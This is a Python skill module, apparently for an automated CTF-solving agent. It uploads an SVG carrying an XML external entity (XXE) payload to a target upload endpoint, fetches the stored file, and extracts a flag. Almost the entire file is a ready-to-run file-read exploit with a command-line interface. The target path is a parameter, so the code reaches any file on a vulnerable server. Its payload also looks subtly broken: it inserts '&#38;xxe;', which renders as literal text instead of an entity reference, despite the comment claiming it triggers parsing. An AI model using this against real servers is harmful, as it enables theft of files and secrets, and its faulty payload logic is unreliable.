"""web_xxe_file_read skill：上传类/XML 处理题的 XXE 文件读取。

场景：上传点接受 SVG（image/svg+xml），服务器解析 XML 时未禁用外部实体
→ 构造 SVG XXE 读取 /flag 等目标文件。

用法（作为 skill 被 SkillManager 调用）：
    params = {'upload_url': url, 'view_url': url 或 '', 'target_file': '/flag'}
    result = web_xxe_file_read(params)  -> 文件内容字符串
"""

import base64
import re
import time  # AST 白名单允许 import time（禁止 __import__()）

_XXE_SVG_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///{target}"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="30" font-size="14">{entity_ref}</text>
</svg>"""


def build_xxe_svg(target_file: str = "/flag") -> bytes:
    """生成 XXE SVG payload（用 &#xxe; 实体引用触发解析）。"""
    svg = _XXE_SVG_TEMPLATE.replace("{target}", target_file.lstrip("/"))
    # 用 HTML 实体形式引用 xxe，避免某些解析器忽略文本节点
    svg = svg.replace("{entity_ref}", "&#38;xxe;")
    return svg.encode("utf-8")


async def web_xxe_file_read(params: dict) -> dict:
    """上传 SVG XXE payload 并尝试读取目标文件。

    params:
        upload_url: 上传端点（multipart 字段名默认 file，可用 file_field 覆盖）
        view_url:   查看/访问上传文件的端点（可空，则只返回上传结果）
        target_file: 要读取的目标（默认 /flag）
        file_field:  上传字段名（默认 file）
    """
    import httpx

    upload_url = params.get("upload_url", "")
    view_url = params.get("view_url", "")
    target = params.get("target_file", "/flag")
    field = params.get("file_field", "file")
    if not upload_url:
        return {"ok": False, "error": "missing upload_url"}

    svg = build_xxe_svg(target)
    files = {field: (f"xxe_{int(time.time())}.svg", svg, "image/svg+xml")}

    async with httpx.AsyncClient(timeout=30) as client:
        try:
            r = await client.post(upload_url, files=files, follow_redirects=True)
            upload_info = {"status": r.status_code, "body": r.text[:300]}
        except Exception as exc:
            return {"ok": False, "error": f"upload failed: {exc}"}

        # 尝试从上传响应中提取文件路径
        path_match = re.search(r"(/[\w/]+\.svg)", r.text)
        file_path = path_match.group(1) if path_match else ""
        if not file_path and view_url:
            # 尝试直接从 view 端点带文件名访问
            file_path = view_url
        elif file_path and view_url:
            file_path = view_url.rstrip("/") + file_path

        # 访问上传的 SVG（服务器解析 XML → XXE 触发）
        if file_path and "://" in file_path:
            try:
                r2 = await client.get(file_path, timeout=30)
                content = r2.text
                # 提取实体内容（flag 通常以文本出现在响应中）
                flag = _extract_flag(content)
                return {
                    "ok": True,
                    "content": content[:2000],
                    "flag": flag,
                    "upload": upload_info,
                }
            except Exception as exc:
                return {"ok": False, "error": f"view failed: {exc}", "upload": upload_info}

        return {"ok": True, "upload": upload_info, "note": "no view url, check upload response"}


def _extract_flag(text: str) -> str:
    """从响应文本提取 flag（支持 flag{} / DASCTF{} 等）。"""
    m = re.search(r"(?:DASCTF|flag|ctf)\{[^}\s]{4,}\}", text, re.I)
    return m.group(0) if m else ""


def run(params):
    """SkillManager 统一入口：转发到业务函数。"""
    return web_xxe_file_read(params)


def main() -> None:
    import argparse

    parser = argparse.ArgumentParser(description="XXE SVG 文件读取")
    parser.add_argument("--upload", required=True, help="上传端点 URL")
    parser.add_argument("--view", default="", help="查看端点 URL")
    parser.add_argument("--file", default="/flag", help="目标文件")
    args = parser.parse_args()

    import asyncio

    result = asyncio.run(web_xxe_file_read({
        "upload_url": args.upload,
        "view_url": args.view,
        "target_file": args.file,
    }))
    print(result)


if __name__ == "__main__":
    main()
